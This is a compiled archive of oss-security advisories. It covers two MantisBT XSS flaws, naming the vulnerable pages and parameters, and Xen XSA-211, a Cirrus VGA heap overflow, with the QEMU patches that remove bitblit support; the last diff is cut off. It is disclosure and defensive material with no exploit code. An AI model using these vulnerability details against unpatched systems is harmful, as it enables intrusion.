## mantisbt
<details>
<summary><strong>[oss-security] Advisory: XSS issues in MantisBT (CVE-2017-6797, CVE-2017-6799)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489180562.16902_22.Morbo,U=40782:2,T -->

##### Damien Regad <dregad@mantisbt.org>, `CA+zp4VOOxRQqdJzt_ZPK3RDXo2zxmq+xEpnYUThtCoJCtwtEzw@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Please take note of the following 2 cross-site scripting issues in MantisBT

Best regards
Damien Regad
MantisBT developer


1. CVE-2017-6797: XSS in bug_change_status_page.php

A cross-site scripting (XSS) vulnerability in bug_change_status_page.php
allows remote attackers to inject arbitrary JavaScript via the
'action_type' parameter.

Affected versions: 1.3.0-beta.3 through 2.2.0
Fixed in versions: 1.3.7, 2.2.1 (not yet released)

Patch:
- 1.3:
https://github.com/mantisbt/mantisbt/commit/a2d90ecabf3bcf3aa22ed9dbbecfd3d37902956f
- 2.x:
https://github.com/mantisbt/mantisbt/commit/c272c3f65da9677e505ff692b1f1e476b3afa56e

Credits:
Reported by Etienne Landais, fixed by Damien Regad (MantisBT developer)

References:
MantisBT issue tracker http://www.mantisbt.org/bugs/view.php?id=22486


2. CVE-2017-6799 - XSS in view_filters_page.php

A cross-site scripting (XSS) vulnerability in view_filters_page.php allows
remote attackers to inject arbitrary JavaScript via the 'view_type'
parameter.

Affected versions: 2.1.0 through 2.2.0; fixed
Fixed in versions: 2.2.1 (not yet released)

Patch:
https://github.com/mantisbt/mantisbt/commit/1677251434b6e8b2be8f1d4376a3e78f7be14d95

Credits:
Reported by Etienne Landais, fixed by Damien Regad (MantisBT developer)

References:
MantisBT issue tracker http://www.mantisbt.org/bugs/view.php?id=22497


```

</details>

---

</details>

## cirrus
<details>
<summary><strong>[oss-security] Xen Security Advisory 211 (CVE-2016-9603) - Cirrus VGA Heap overflow via display refresh</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489493001.19389_1.Morbo,U=9164:2,T -->

##### Xen.org security team <security@xen.org>, `E1cnl7y-00011j-9R@xenbits.xenproject.org`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

            Xen Security Advisory CVE-2016-9603 / XSA-211
                              version 2

             Cirrus VGA Heap overflow via display refresh

UPDATES IN VERSION 2
====================

Patches for qemu-xen-traditional.

Public release.

ISSUE DESCRIPTION
=================

When a graphics update command gets passed to the VGA emulator, there
are 3 possible modes that can be used to update the display:

* blank - Clears the display
* text - Treats the display as showing text
* graph - Treats the display as showing graphics

After the display geometry gets changed (i.e., after the CIRRUS VGA
emulation has resized the display), the VGA emulator will resize the
console during the next update command. However, when a blank mode is
also selected during an update, this resize doesn't happen. The resize
will be properly handled during the next time a non-blank mode is
selected during an update.

However, other console components - such as the VNC emulation - will
operate as though this resize had happened. When the display is
resized to be larger than before, this can result in a heap overflow
as console components will expect the display buffer to be larger than
it is currently allocated.

IMPACT
======

A privileged user within the guest VM can cause a heap overflow in the
device model process, potentially escalating their privileges to that
of the device model process.

VULNERABLE SYSTEMS
==================

All versions of Xen are vulnerable.

Only HVM guests with the Cirrus video card are vulnerable.  (The
Cirrus video card is the default.)  Both qemu-upstream and
qemu-traditional are vulnerable.

For HVM guests with the device model running in a stub domain, "the
privileges of the device model process" are identical to those of the
guest kernel.  But the ability of a userspace process to trigger this
vulnerability via legitimate commands to the kernel driver (thus
elevating its privileges to that of the guest kernel) cannot be ruled
out.

MITIGATION
==========

Running only PV guests, or running HVM guests with the stgvga driver,
will avoid this vulnerability.

Running HVM guests with stub domains will mitigate the vulnerability to
at most a guest kernel privilege escalation.

CREDITS
=======

The discoverer of this issue requested to remain anonymous.

RESOLUTION
==========

Applying the appropriate attached patch resolves this issue (and any
further bitblit vulnerabilities) by disabling the bitblit
functionality from the Cirrus VGA device entirely.

xsa211-qemuu.patch     qemu-upstream master
xsa211-qemuu-4.8.patch qemu-upstream 4.8
xsa211-qemuu-4.7.patch qemu-upstream 4.7
xsa211-qemuu-4.6.patch qemu-upstream 4.6 and 4.5
xsa211-qemuu-4.4.patch qemu-upstream 4.4
xsa211-qemut.patch     qemu-xen-traditional 4.6 and later
xsa211-qemut-4.5.patch qemu-xen-traditional 4.4 and 4.5

$ sha256sum xsa211*
9d0cf413dcc9654ee95f6b04fa9c5714f36775cbc9ab0390a3041ec4a68845ab  xsa211-qemut.patch
d307d67fbf3707a324da537e593702eaff3df2068b559ef19e857b493881155e  xsa211-qemut-4.5.patch
0fe17378cf2bc2742f068adf31331f36e01b0f4ffa9c596160fdba2bed3e870a  xsa211-qemuu.patch
1808aa443123d8713241a60021507a4d9c142c3cd07233e2f38e9b9b28025ae2  xsa211-qemuu-4.4.patch
5053c7cb392f34a234287092293bb91f261ed68f4b58fe856fe353b647ed5beb  xsa211-qemuu-4.6.patch
c5884bd441ae8cecce84385c99bcb72ba0eae480a013846fa59c1255aef4808f  xsa211-qemuu-4.7.patch
bea7cf4065bd9d0085f4dfc3395e59c3ca9d4de9d786a3018c8dc7fd9f3d8b6e  xsa211-qemuu-4.8.patch
$

NOTE REGARDING EMBARGO
======================

The embargo period is much shorter than our standard two-week period.
This is at the request of the discoverer.

DEPLOYMENT DURING EMBARGO
=========================

Deployment of the patches and/or the mitigation of running with an HVM
stub domain (or others which are substantially similar) is permitted
during the embargo, even on public-facing systems with untrusted guest
users and administrators.

It is NOT permitted during the embargo to switch from Cirrus VGA to
Stdvga on public-facing systems with untrusted guest users or
administrators.  This is because it may give a clue where the issue
lies.  This mitigation is only permitted AFTER the embargo ends.

As always, distribution of updated software is prohibited (except to
other members of the predisclosure list).

Predisclosure list members who wish to deploy significantly different
patches and/or mitigations, please contact the Xen Project Security
Team.

(Note: this during-embargo deployment notice is retained in
post-embargo publicly released Xen Project advisories, even though it
is then no longer applicable.  This is to enable the community to have
oversight of the Xen Project Security Team's decisionmaking.)

For more information about permissible uses of embargoed information,
consult the Xen Project community's agreed Security Policy:
  http://www.xenproject.org/security-policy.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQEcBAEBAgAGBQJYx9rlAAoJEIP+FMlX6CvZ3dsH/0BNA6oYy8Ix8L3224Nbjv7p
ydZTagriqoKCHr5nmvUosg/52vxo3drZy6vfZBL1xLBNNKoET3NBeC7bo8jOWZnb
k1fp2naLtWV2ZqOtA5FfEphexPC6iJxm517q/3RsM2bwQMA/x4UH+5TNSG20avLW
LYofU+pTz7oyvgxShXBcHC/z+cyZqfnYKDL2ErsiiHgvwQQ08+MrGGLLviLxNiPL
JuMxVQXzGOJsxzkF5pSYAIlggnMkW85NrsDrkh1lW/F3TezLJDlqhP2c67vWVJq2
wFLcG+DLx+4gGnzMKKy8gtf8VnWxv/8X470oieM2NKPwYLw5yfUsiHe5w2XuPMo=
=wLoq
-----END PGP SIGNATURE-----


```

</details>
<details><summary>Additional Parts</summary>

```
From 29e67cfd46b4d06ca1bb75558e227ec34a6af35f Mon Sep 17 00:00:00 2001
From: Ian Jackson <ian.jackson@eu.citrix.com>
Date: Thu, 9 Mar 2017 11:14:55 +0000
Subject: [PATCH] cirrus/vnc: zap drop bitblit support from console code.

From: Gerd Hoffmann <kraxel@redhat.com>

There is a special code path (dpy_gfx_copy) to allow graphic emulation
notify user interface code about bitblit operations carryed out by
guests.  It is supported by cirrus and vnc server.  The intended purpose
is to optimize display scrolls and just send over the scroll op instead
of a full display update.

This is rarely used these days though because modern guests simply don't
use the cirrus blitter any more.  Any linux guest using the cirrus drm
driver doesn't.  Any windows guest newer than winxp doesn't ship with a
cirrus driver any more and thus uses the cirrus as simple framebuffer.

So this code tends to bitrot and bugs can go unnoticed for a long time.
See for example commit "3e10c3e vnc: fix qemu crash because of SIGSEGV"
which fixes a bug lingering in the code for almost a year, added by
commit "c7628bf vnc: only alloc server surface with clients connected".

Also the vnc server will throttle the frame rate in case it figures the
network can't keep up (send buffers are full).  This doesn't work with
dpy_gfx_copy, for any copy operation sent to the vnc client we have to
send all outstanding updates beforehand, otherwise the vnc client might
run the client side blit on outdated data and thereby corrupt the
display.  So this dpy_gfx_copy "optimization" might even make things
worse on slow network links.

Lets kill it once for all.

Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>

These changes (dropping dpy_copy and all its references and
implementations) reimplemented for qemu-xen-traditional.

This is XSA-211.

Signed-off-by: Ian Jackson <ian.jackson@eu.citrix.com>
---
 console.c       |  8 --------
 console.h       | 16 ----------------
 hw/cirrus_vga.c | 15 +++++----------
 hw/vmware_vga.c |  1 +
 vnc.c           | 35 -----------------------------------
 5 files changed, 6 insertions(+), 69 deletions(-)

diff --git a/console.c b/console.c
index d4f1ad0..e61b53b 100644
--- a/console.c
+++ b/console.c
@@ -1399,14 +1399,6 @@ void qemu_console_resize(DisplayState *ds, int width, int height)
     }
 }
 
-void qemu_console_copy(DisplayState *ds, int src_x, int src_y,
-                int dst_x, int dst_y, int w, int h)
-{
-    if (is_graphic_console()) {
-        dpy_copy(ds, src_x, src_y, dst_x, dst_y, w, h);
-    }
-}
-
 PixelFormat qemu_different_endianness_pixelformat(int bpp)
 {
     PixelFormat pf;
diff --git a/console.h b/console.h
index 14b42f3..8306cc4 100644
--- a/console.h
+++ b/console.h
@@ -98,8 +98,6 @@ struct DisplayChangeListener {
     void (*dpy_resize)(struct DisplayState *s);
     void (*dpy_setdata)(struct DisplayState *s);
     void (*dpy_refresh)(struct DisplayState *s);
-    void (*dpy_copy)(struct DisplayState *s, int src_x, int src_y,
-                     int dst_x, int dst_y, int w, int h);
     void (*dpy_fill)(struct DisplayState *s, int x, int y,
                      int w, int h, uint32_t c);
     void (*dpy_text_cursor)(struct DisplayState *s, int x, int y);
@@ -211,18 +209,6 @@ static inline void dpy_refresh(DisplayState *s)
     }
 }
 
-static inline void dpy_copy(struct DisplayState *s, int src_x, int src_y,
-                             int dst_x, int dst_y, int w, int h) {
-    struct DisplayChangeListener *dcl = s->listeners;
-    while (dcl != NULL) {
-        if (dcl->dpy_copy)
-            dcl->dpy_copy(s, src_x, src_y, dst_x, dst_y, w, h);
-        else /* TODO */
-            dcl->dpy_update(s, dst_x, dst_y, w, h);
-        dcl = dcl->next;
-    }
-}
-
 static inline void dpy_fill(struct DisplayState *s, int x, int y,
                              int w, int h, uint32_t c) {
     struct DisplayChangeListener *dcl = s->listeners;
@@ -297,8 +283,6 @@ void text_consoles_set_display(DisplayState *ds);
 void console_select(unsigned int index);
 void console_color_init(DisplayState *ds);
 void qemu_console_resize(DisplayState *ds, int width, int height);
-void qemu_console_copy(DisplayState *ds, int src_x, int src_y,
-                int dst_x, int dst_y, int w, int h);
 
 /* sdl.c */
 void sdl_display_init(DisplayState *ds, int full_screen, int no_frame, int opengl_enabled);
diff --git a/hw/cirrus_vga.c b/hw/cirrus_vga.c
index 06b4a3b..4e85b90 100644
--- a/hw/cirrus_vga.c
+++ b/hw/cirrus_vga.c
@@ -793,11 +793,6 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
         }
     }
 
-    /* we have to flush all pending changes so that the copy
-       is generated at the appropriate moment in time */
-    if (notify)
-	vga_hw_update();
-
     (*s->cirrus_rop) (s, s->vram_ptr +
 		      (s->cirrus_blt_dstaddr & s->cirrus_addr_mask),
 		      s->vram_ptr +
@@ -806,13 +801,13 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
 		      s->cirrus_blt_width, s->cirrus_blt_height);
 
     if (notify)
-	qemu_console_copy(s->ds,
-			  sx, sy, dx, dy,
-			  s->cirrus_blt_width / depth,
-			  s->cirrus_blt_height);
+	dpy_update(s->ds,
+                   dx, dy,
+                   s->cirrus_blt_width / depth,
+                   s->cirrus_blt_height);
 
     /* we don't have to notify the display that this portion has
-       changed since qemu_console_copy implies this */
+       changed since dpy_update implies this */
 
     cirrus_invalidate_region(s, s->cirrus_blt_dstaddr,
 				s->cirrus_blt_dstpitch, s->cirrus_blt_width,
diff --git a/hw/vmware_vga.c b/hw/vmware_vga.c
index d1cba28..c38e43c 100644
--- a/hw/vmware_vga.c
+++ b/hw/vmware_vga.c
@@ -383,6 +383,7 @@ static inline void vmsvga_copy_rect(struct vmsvga_state_s *s,
 
 # ifdef DIRECT_VRAM
     if (s->ds->dpy_copy)
+#  error This configuration is not supported.  See XSA-211.
         qemu_console_copy(s->ds, x0, y0, x1, y1, w, h);
     else
 # endif
diff --git a/vnc.c b/vnc.c
index 61d1555..0e61197 100644
--- a/vnc.c
+++ b/vnc.c
@@ -572,36 +572,6 @@ static void send_framebuffer_update(VncState *vs, int x, int y, int w, int h)
 	    send_framebuffer_update_raw(vs, x, y, w, h);
 }
 
-static void vnc_copy(DisplayState *ds, int src_x, int src_y, int dst_x, int dst_y, int w, int h)
-{
-    VncState *vs = ds->opaque;
-    int updating_client = 1;
-
-    if (!vs->update_requested ||
-        src_x < vs->visible_x || src_y < vs->visible_y ||
-	dst_x < vs->visible_x || dst_y < vs->visible_y ||
-	(src_x + w) > (vs->visible_x + vs->visible_w) ||
-	(src_y + h) > (vs->visible_y + vs->visible_h) ||
-	(dst_x + w) > (vs->visible_x + vs->visible_w) ||
-	(dst_y + h) > (vs->visible_y + vs->visible_h))
-	updating_client = 0;
-
-    if (updating_client)
-        _vnc_update_client(vs);
-
-    if (updating_client && vs->csock != -1 && !vs->has_update) {
-	vnc_write_u8(vs, 0);  /* msg id */
-	vnc_write_u8(vs, 0);
-	vnc_write_u16(vs, 1); /* number of rects */
-	vnc_framebuffer_update(vs, dst_x, dst_y, w, h, 1);
-	vnc_write_u16(vs, src_x);
-	vnc_write_u16(vs, src_y);
-	vnc_flush(vs);
-        vs->update_requested--;
-    } else
-	framebuffer_set_updated(vs, dst_x, dst_y, w, h);
-}
-
 static int find_update_height(VncState *vs, int y, int maxy, int last_x, int x)
 {
     int h;
@@ -1543,16 +1513,12 @@ static void set_encodings(VncState *vs, int32_t *encodings, size_t n_encodings)
     vs->has_pointer_type_change = 0;
     vs->has_WMVi = 0;
     vs->absolute = -1;
-    dcl->dpy_copy = NULL;
 
     for (i = n_encodings - 1; i >= 0; i--) {
 	switch (encodings[i]) {
 	case 0: /* Raw */
 	    vs->has_hextile = 0;
 	    break;
-	case 1: /* CopyRect */
-	    dcl->dpy_copy = vnc_copy;
-	    break;
 	case 5: /* Hextile */
 	    vs->has_hextile = 1;
 	    break;
@@ -2459,7 +2425,6 @@ static void vnc_listen_read(void *opaque)
 	vs->has_resize = 0;
 	vs->has_hextile = 0;
         vs->update_requested = 0;
-	dcl->dpy_copy = NULL;
 	vnc_timer_init(vs);
     }
 }
-- 
2.1.4


```

</details>
<details><summary>Additional Parts</summary>

```
From dc4eee43ac608337ae96a174e0a5c1278168bd56 Mon Sep 17 00:00:00 2001
From: Ian Jackson <ian.jackson@eu.citrix.com>
Date: Thu, 9 Mar 2017 11:14:55 +0000
Subject: [PATCH] cirrus/vnc: zap drop bitblit support from console code.

From: Gerd Hoffmann <kraxel@redhat.com>

There is a special code path (dpy_gfx_copy) to allow graphic emulation
notify user interface code about bitblit operations carryed out by
guests.  It is supported by cirrus and vnc server.  The intended purpose
is to optimize display scrolls and just send over the scroll op instead
of a full display update.

This is rarely used these days though because modern guests simply don't
use the cirrus blitter any more.  Any linux guest using the cirrus drm
driver doesn't.  Any windows guest newer than winxp doesn't ship with a
cirrus driver any more and thus uses the cirrus as simple framebuffer.

So this code tends to bitrot and bugs can go unnoticed for a long time.
See for example commit "3e10c3e vnc: fix qemu crash because of SIGSEGV"
which fixes a bug lingering in the code for almost a year, added by
commit "c7628bf vnc: only alloc server surface with clients connected".

Also the vnc server will throttle the frame rate in case it figures the
network can't keep up (send buffers are full).  This doesn't work with
dpy_gfx_copy, for any copy operation sent to the vnc client we have to
send all outstanding updates beforehand, otherwise the vnc client might
run the client side blit on outdated data and thereby corrupt the
display.  So this dpy_gfx_copy "optimization" might even make things
worse on slow network links.

Lets kill it once for all.

Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>

These changes (dropping dpy_copy and all its references and
implementations) reimplemented for qemu-xen-traditional.

This is XSA-211.

Signed-off-by: Ian Jackson <ian.jackson@eu.citrix.com>

Conflicts:
	hw/cirrus_vga.c
---
 console.c       |  8 --------
 console.h       | 16 ----------------
 hw/cirrus_vga.c | 15 +++++----------
 hw/vmware_vga.c |  1 +
 vnc.c           | 35 -----------------------------------
 5 files changed, 6 insertions(+), 69 deletions(-)

diff --git a/console.c b/console.c
index 9984d6f..33c8bac 100644
--- a/console.c
+++ b/console.c
@@ -1398,14 +1398,6 @@ void qemu_console_resize(DisplayState *ds, int width, int height)
     }
 }
 
-void qemu_console_copy(DisplayState *ds, int src_x, int src_y,
-                int dst_x, int dst_y, int w, int h)
-{
-    if (is_graphic_console()) {
-        dpy_copy(ds, src_x, src_y, dst_x, dst_y, w, h);
-    }
-}
-
 PixelFormat qemu_different_endianness_pixelformat(int bpp)
 {
     PixelFormat pf;
diff --git a/console.h b/console.h
index 14b42f3..8306cc4 100644
--- a/console.h
+++ b/console.h
@@ -98,8 +98,6 @@ struct DisplayChangeListener {
     void (*dpy_resize)(struct DisplayState *s);
     void (*dpy_setdata)(struct DisplayState *s);
     void (*dpy_refresh)(struct DisplayState *s);
-    void (*dpy_copy)(struct DisplayState *s, int src_x, int src_y,
-                     int dst_x, int dst_y, int w, int h);
     void (*dpy_fill)(struct DisplayState *s, int x, int y,
                      int w, int h, uint32_t c);
     void (*dpy_text_cursor)(struct DisplayState *s, int x, int y);
@@ -211,18 +209,6 @@ static inline void dpy_refresh(DisplayState *s)
     }
 }
 
-static inline void dpy_copy(struct DisplayState *s, int src_x, int src_y,
-                             int dst_x, int dst_y, int w, int h) {
-    struct DisplayChangeListener *dcl = s->listeners;
-    while (dcl != NULL) {
-        if (dcl->dpy_copy)
-            dcl->dpy_copy(s, src_x, src_y, dst_x, dst_y, w, h);
-        else /* TODO */
-            dcl->dpy_update(s, dst_x, dst_y, w, h);
-        dcl = dcl->next;
-    }
-}
-
 static inline void dpy_fill(struct DisplayState *s, int x, int y,
                              int w, int h, uint32_t c) {
     struct DisplayChangeListener *dcl = s->listeners;
@@ -297,8 +283,6 @@ void text_consoles_set_display(DisplayState *ds);
 void console_select(unsigned int index);
 void console_color_init(DisplayState *ds);
 void qemu_console_resize(DisplayState *ds, int width, int height);
-void qemu_console_copy(DisplayState *ds, int src_x, int src_y,
-                int dst_x, int dst_y, int w, int h);
 
 /* sdl.c */
 void sdl_display_init(DisplayState *ds, int full_screen, int no_frame, int opengl_enabled);
diff --git a/hw/cirrus_vga.c b/hw/cirrus_vga.c
index d4bb462..3f941d1 100644
--- a/hw/cirrus_vga.c
+++ b/hw/cirrus_vga.c
@@ -793,11 +793,6 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
 	*s->cirrus_rop != cirrus_bitblt_rop_bkwd_src)
 	notify = 0;
 
-    /* we have to flush all pending changes so that the copy
-       is generated at the appropriate moment in time */
-    if (notify)
-	vga_hw_update();
-
     (*s->cirrus_rop) (s, s->vram_ptr +
 		      (s->cirrus_blt_dstaddr & s->cirrus_addr_mask),
 		      s->vram_ptr +
@@ -806,13 +801,13 @@ static void cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
 		      s->cirrus_blt_width, s->cirrus_blt_height);
 
     if (notify)
-	qemu_console_copy(s->ds,
-			  sx, sy, dx, dy,
-			  s->cirrus_blt_width / depth,
-			  s->cirrus_blt_height);
+	dpy_update(s->ds,
+                   dx, dy,
+                   s->cirrus_blt_width / depth,
+                   s->cirrus_blt_height);
 
     /* we don't have to notify the display that this portion has
-       changed since qemu_console_copy implies this */
+       changed since dpy_update implies this */
 
     cirrus_invalidate_region(s, s->cirrus_blt_dstaddr,
 				s->cirrus_blt_dstpitch, s->cirrus_blt_width,
diff --git a/hw/vmware_vga.c b/hw/vmware_vga.c
index d1cba28..c38e43c 100644
--- a/hw/vmware_vga.c
+++ b/hw/vmware_vga.c
@@ -383,6 +383,7 @@ static inline void vmsvga_copy_rect(struct vmsvga_state_s *s,
 
 # ifdef DIRECT_VRAM
     if (s->ds->dpy_copy)
+#  error This configuration is not supported.  See XSA-211.
         qemu_console_copy(s->ds, x0, y0, x1, y1, w, h);
     else
 # endif
diff --git a/vnc.c b/vnc.c
index 61d1555..0e61197 100644
--- a/vnc.c
+++ b/vnc.c
@@ -572,36 +572,6 @@ static void send_framebuffer_update(VncState *vs, int x, int y, int w, int h)
 	    send_framebuffer_update_raw(vs, x, y, w, h);
 }
 
-static void vnc_copy(DisplayState *ds, int src_x, int src_y, int dst_x, int dst_y, int w, int h)
-{
-    VncState *vs = ds->opaque;
-    int updating_client = 1;
-
-    if (!vs->update_requested ||
-        src_x < vs->visible_x || src_y < vs->visible_y ||
-	dst_x < vs->visible_x || dst_y < vs->visible_y ||
-	(src_x + w) > (vs->visible_x + vs->visible_w) ||
-	(src_y + h) > (vs->visible_y + vs->visible_h) ||
-	(dst_x + w) > (vs->visible_x + vs->visible_w) ||
-	(dst_y + h) > (vs->visible_y + vs->visible_h))
-	updating_client = 0;
-
-    if (updating_client)
-        _vnc_update_client(vs);
-
-    if (updating_client && vs->csock != -1 && !vs->has_update) {
-	vnc_write_u8(vs, 0);  /* msg id */
-	vnc_write_u8(vs, 0);
-	vnc_write_u16(vs, 1); /* number of rects */
-	vnc_framebuffer_update(vs, dst_x, dst_y, w, h, 1);
-	vnc_write_u16(vs, src_x);
-	vnc_write_u16(vs, src_y);
-	vnc_flush(vs);
-        vs->update_requested--;
-    } else
-	framebuffer_set_updated(vs, dst_x, dst_y, w, h);
-}
-
 static int find_update_height(VncState *vs, int y, int maxy, int last_x, int x)
 {
     int h;
@@ -1543,16 +1513,12 @@ static void set_encodings(VncState *vs, int32_t *encodings, size_t n_encodings)
     vs->has_pointer_type_change = 0;
     vs->has_WMVi = 0;
     vs->absolute = -1;
-    dcl->dpy_copy = NULL;
 
     for (i = n_encodings - 1; i >= 0; i--) {
 	switch (encodings[i]) {
 	case 0: /* Raw */
 	    vs->has_hextile = 0;
 	    break;
-	case 1: /* CopyRect */
-	    dcl->dpy_copy = vnc_copy;
-	    break;
 	case 5: /* Hextile */
 	    vs->has_hextile = 1;
 	    break;
@@ -2459,7 +2425,6 @@ static void vnc_listen_read(void *opaque)
 	vs->has_resize = 0;
 	vs->has_hextile = 0;
         vs->update_requested = 0;
-	dcl->dpy_copy = NULL;
 	vnc_timer_init(vs);
     }
 }
-- 
2.1.4


```

</details>
<details><summary>Additional Parts</summary>

```
From d5c69cc8c0a902b6a266f01a8d9a9a47be8d0519 Mon Sep 17 00:00:00 2001
From: Gerd Hoffmann <kraxel@redhat.com>
Date: Tue, 14 Feb 2017 19:09:59 +0100
Subject: [PATCH] cirrus/vnc: zap bitblit support from console code.

There is a special code path (dpy_gfx_copy) to allow graphic emulation
notify user interface code about bitblit operations carryed out by
guests.  It is supported by cirrus and vnc server.  The intended purpose
is to optimize display scrolls and just send over the scroll op instead
of a full display update.

This is rarely used these days though because modern guests simply don't
use the cirrus blitter any more.  Any linux guest using the cirrus drm
driver doesn't.  Any windows guest newer than winxp doesn't ship with a
cirrus driver any more and thus uses the cirrus as simple framebuffer.

So this code tends to bitrot and bugs can go unnoticed for a long time.
See for example commit "3e10c3e vnc: fix qemu crash because of SIGSEGV"
which fixes a bug lingering in the code for almost a year, added by
commit "c7628bf vnc: only alloc server surface with clients connected".

Also the vnc server will throttle the frame rate in case it figures the
network can't keep up (send buffers are full).  This doesn't work with
dpy_gfx_copy, for any copy operation sent to the vnc client we have to
send all outstanding updates beforehand, otherwise the vnc client might
run the client side blit on outdated data and thereby corrupt the
display.  So this dpy_gfx_copy "optimization" might even make things
worse on slow network links.

Lets kill it once for all.

Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
---
 hw/display/cirrus_vga.c |  12 ++----
 include/ui/console.h    |   7 ----
 ui/console.c            |  28 --------------
 ui/vnc.c                | 100 ------------------------------------------------
 4 files changed, 3 insertions(+), 144 deletions(-)

diff --git a/hw/display/cirrus_vga.c b/hw/display/cirrus_vga.c
index 6766349..468a259 100644
--- a/hw/display/cirrus_vga.c
+++ b/hw/display/cirrus_vga.c
@@ -766,11 +766,6 @@ static int cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
         }
     }
 
-    /* we have to flush all pending changes so that the copy
-       is generated at the appropriate moment in time */
-    if (notify)
-        graphic_hw_update(s->vga.con);
-
     (*s->cirrus_rop) (s, s->vga.vram_ptr +
 		      (s->cirrus_blt_dstaddr & s->cirrus_addr_mask),
 		      s->vga.vram_ptr +
@@ -779,10 +774,9 @@ static int cirrus_do_copy(CirrusVGAState *s, int dst, int src, int w, int h)
 		      s->cirrus_blt_width, s->cirrus_blt_height);
 
     if (notify) {
-        qemu_console_copy(s->vga.con,
-			  sx, sy, dx, dy,
-			  s->cirrus_blt_width / depth,
-			  s->cirrus_blt_height);
+        dpy_gfx_update(s->vga.con, dx, dy,
+                       s->cirrus_blt_width / depth,
+                       s->cirrus_blt_height);
     }
 
     /* we don't have to notify the display that this portion has
diff --git a/include/ui/console.h b/include/ui/console.h
index e2589e2..101f1c7 100644
--- a/include/ui/console.h
+++ b/include/ui/console.h
@@ -189,9 +189,6 @@ typedef struct DisplayChangeListenerOps {
                            int x, int y, int w, int h);
     void (*dpy_gfx_switch)(DisplayChangeListener *dcl,
                            struct DisplaySurface *new_surface);
-    void (*dpy_gfx_copy)(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h);
     bool (*dpy_gfx_check_format)(DisplayChangeListener *dcl,
                                  pixman_format_code_t format);
 
@@ -273,8 +270,6 @@ int dpy_set_ui_info(QemuConsole *con, QemuUIInfo *info);
 void dpy_gfx_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_gfx_replace_surface(QemuConsole *con,
                              DisplaySurface *surface);
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h);
 void dpy_text_cursor(QemuConsole *con, int x, int y);
 void dpy_text_update(QemuConsole *con, int x, int y, int w, int h);
 void dpy_text_resize(QemuConsole *con, int w, int h);
@@ -397,8 +392,6 @@ int qemu_console_get_height(QemuConsole *con, int fallback);
 
 void console_select(unsigned int index);
 void qemu_console_resize(QemuConsole *con, int width, int height);
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h);
 DisplaySurface *qemu_console_surface(QemuConsole *con);
 
 /* console-gl.c */
diff --git a/ui/console.c b/ui/console.c
index ed888e5..3af7fc9 100644
--- a/ui/console.c
+++ b/ui/console.c
@@ -1562,27 +1562,6 @@ static void dpy_refresh(DisplayState *s)
     }
 }
 
-void dpy_gfx_copy(QemuConsole *con, int src_x, int src_y,
-                  int dst_x, int dst_y, int w, int h)
-{
-    DisplayState *s = con->ds;
-    DisplayChangeListener *dcl;
-
-    if (!qemu_console_is_visible(con)) {
-        return;
-    }
-    QLIST_FOREACH(dcl, &s->listeners, next) {
-        if (con != (dcl->con ? dcl->con : active_console)) {
-            continue;
-        }
-        if (dcl->ops->dpy_gfx_copy) {
-            dcl->ops->dpy_gfx_copy(dcl, src_x, src_y, dst_x, dst_y, w, h);
-        } else { /* TODO */
-            dcl->ops->dpy_gfx_update(dcl, dst_x, dst_y, w, h);
-        }
-    }
-}
-
 void dpy_text_cursor(QemuConsole *con, int x, int y)
 {
     DisplayState *s = con->ds;
@@ -2120,13 +2099,6 @@ void qemu_console_resize(QemuConsole *s, int width, int height)
     dpy_gfx_replace_surface(s, surface);
 }
 
-void qemu_console_copy(QemuConsole *con, int src_x, int src_y,
-                       int dst_x, int dst_y, int w, int h)
-{
-    assert(con->console_type == GRAPHIC_CONSOLE);
-    dpy_gfx_copy(con, src_x, src_y, dst_x, dst_y, w, h);
-}
-
 DisplaySurface *qemu_console_surface(QemuConsole *console)
 {
     return console->surface;
diff --git a/ui/vnc.c b/ui/vnc.c
index 2c28a59..8de2646 100644
--- a/ui/vnc.c
+++ b/ui/vnc.c
@@ -872,105 +872,6 @@ int vnc_send_framebuffer_update(VncState *vs, int x, int y, int w, int h)
     return n;
 }
 
-static void vnc_copy(VncState *vs, int src_x, int src_y, int dst_x, int dst_y, int w, int h)
-{
-    /* send bitblit op to the vnc client */
-    vnc_lock_output(vs);
-    vnc_write_u8(vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);
-    vnc_write_u8(vs, 0);
-    vnc_write_u16(vs, 1); /* number of rects */
-    vnc_framebuffer_update(vs, dst_x, dst_y, w, h, VNC_ENCODING_COPYRECT);
-    vnc_write_u16(vs, src_x);
-    vnc_write_u16(vs, src_y);
-    vnc_unlock_output(vs);
-    vnc_flush(vs);
-}
-
-static void vnc_dpy_copy(DisplayChangeListener *dcl,
-                         int src_x, int src_y,
-                         int dst_x, int dst_y, int w, int h)
-{
-    VncDisplay *vd = container_of(dcl, VncDisplay, dcl);
-    VncState *vs, *vn;
-    uint8_t *src_row;
-    uint8_t *dst_row;
-    int i, x, y, pitch, inc, w_lim, s;
-    int cmp_bytes;
-
-    if (!vd->server) {
-        /* no client connected */
-        return;
-    }
-
-    vnc_refresh_server_surface(vd);
-    QTAILQ_FOREACH_SAFE(vs, &vd->clients, next, vn) {
-        if (vnc_has_feature(vs, VNC_FEATURE_COPYRECT)) {
-            vs->force_update = 1;
-            vnc_update_client(vs, 1, true);
-            /* vs might be free()ed here */
-        }
-    }
-
-    if (!vd->server) {
-        /* no client connected */
-        return;
-    }
-    /* do bitblit op on the local surface too */
